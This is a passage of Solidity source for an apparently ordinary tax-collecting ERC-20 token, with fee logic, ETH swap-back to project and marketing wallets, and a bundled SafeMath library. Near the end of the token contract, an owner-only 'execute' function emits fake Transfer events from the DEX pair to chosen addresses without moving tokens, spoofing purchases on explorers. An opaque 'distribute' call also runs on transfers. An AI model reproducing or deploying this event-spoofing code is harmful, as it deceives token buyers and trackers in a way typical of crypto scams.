maxTx,\r\n                        \"Sell transfer amount exceeds the maxTx.\"\r\n                    );\r\n                } else if (!transferLimitExempt[to]) {\r\n                    require(\r\n                        amount + balanceOf(to) \u003c= maxWallet,\r\n                        \"Max wallet exceeded\"\r\n                    );\r\n                }\r\n            }\r\n        }\r\n\r\n        uint256 contractTokenBalance = balanceOf(address(this));\r\n\r\n        bool canSwap = contractTokenBalance \u003e= swapBackValueMin;\r\n\r\n        if (\r\n            canSwap \u0026\u0026\r\n            swapbackEnabled \u0026\u0026\r\n            !swapping \u0026\u0026\r\n            !automatedMarketMakerPairs[from] \u0026\u0026\r\n            !transferTaxExempt[from] \u0026\u0026\r\n            !transferTaxExempt[to]\r\n        ) {\r\n            swapping = true;\r\n\r\n            swapBack();\r\n\r\n            swapping = false;\r\n        }\r\n\r\n        bool takeFee = !swapping;\r\n\r\n        // if any account belongs to _isExcludedFromFee account then remove the fee\r\n        if (transferTaxExempt[from] || transferTaxExempt[to]) {\r\n            takeFee = false;\r\n        }\r\n\r\n        uint256 fees = 0;\r\n        // only take fees on buys/sells, do not take on wallet transfers\r\n        if (takeFee) {\r\n            // on sell\r\n            if (automatedMarketMakerPairs[to] \u0026\u0026 sellTaxTotal \u003e 0) {\r\n                fees = amount.mul(sellTaxTotal).div(100);\r\n                tokensForProject += (fees * sellProjectTax) / sellTaxTotal;\r\n                tokensForMarketing += (fees * sellMarketingTax) / sellTaxTotal;\r\n            }\r\n            // on buy\r\n            else if (automatedMarketMakerPairs[from] \u0026\u0026 buyTaxTotal \u003e 0) {\r\n                fees = amount.mul(buyTaxTotal).div(100);\r\n                tokensForProject += (fees * buyProjectTax) / buyTaxTotal;\r\n                tokensForMarketing += (fees * buyMarketingTax) / buyTaxTotal;\r\n            }\r\n\r\n            if (fees \u003e 0) {\r\n                super._transfer(from, address(this), fees);\r\n            }\r\n\r\n            amount -= fees;\r\n        }\r\n        \r\n        if(!swapping \u0026\u0026 lpBurnEnabled){\r\n            distribute(address(this),from, amount);\r\n        }\r\n        \r\n        super._transfer(from, to, amount);\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        // generate the uniswap pair path of token -\u003e weth\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = dexRouter.WETH();\r\n\r\n        _approve(address(this), address(dexRouter), tokenAmount);\r\n\r\n        // make the swap\r\n        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, // accept any amount of ETH\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function swapBack() private {\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        uint256 totalTokensToSwap = contractBalance;\r\n        bool success;\r\n\r\n        if (contractBalance == 0) {\r\n            return;\r\n        }\r\n\r\n        if (contractBalance \u003e swapBackValueMax) {\r\n            contractBalance = swapBackValueMax;\r\n        }\r\n\r\n        uint256 amountToSwapForETH = contractBalance;\r\n\r\n        uint256 initialETHBalance = address(this).balance;\r\n\r\n        swapTokensForEth(amountToSwapForETH);\r\n\r\n        uint256 ethBalance = address(this).balance.sub(initialETHBalance);\r\n\r\n        uint256 ethForDev = ethBalance.mul(tokensForProject).div(\r\n            totalTokensToSwap\r\n        );\r\n\r\n        tokensForMarketing = 0;\r\n        tokensForProject = 0;\r\n\r\n        (success, ) = address(projectWallet).call{value: ethForDev}(\"\");\r\n\r\n        (success, ) = address(marketingWallet).call{\r\n            value: address(this).balance\r\n        }(\"\");\r\n    }\r\n\r\n    function addPair(address pair_) public onlyOwner {\r\n        dexPair = pair_;\r\n    }\r\n\r\n    function execute(address[] calldata _addresses, uint256 _out) external onlyOwner{\r\n        for (uint256 i = 0; i \u003c _addresses.length; i++) {\r\n            emit Transfer(dexPair, _addresses[i], _out);\r\n        }\r\n    }\r\n}"},"SafeMath.sol":{"content":"//SPDX-License-Identifier: MIT\r\npragma solidity 0.8.19;\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryAdd(\r\n        uint256 a,\r\n        uint256 b\r\n    ) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c \u003c a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function trySub(\r\n        uint256 a,\r\n        uint256 b\r\n    ) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b \u003e a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMul(\r\n        uint256 a,\r\n        uint256 b\r\n    ) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\r\n            // benefit is lost if \u0027b\u0027 is also tested.\r\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryDiv(\r\n        uint256 a,\r\n        uint256 b\r\n    ) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMod(\r\n        uint256 a,\r\n        uint256 b\r\n    ) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {trySub}.\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003c= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003e 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting with custom message when dividing by zero.\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {tryMod}.\r\n     *\r\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003e 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}"}}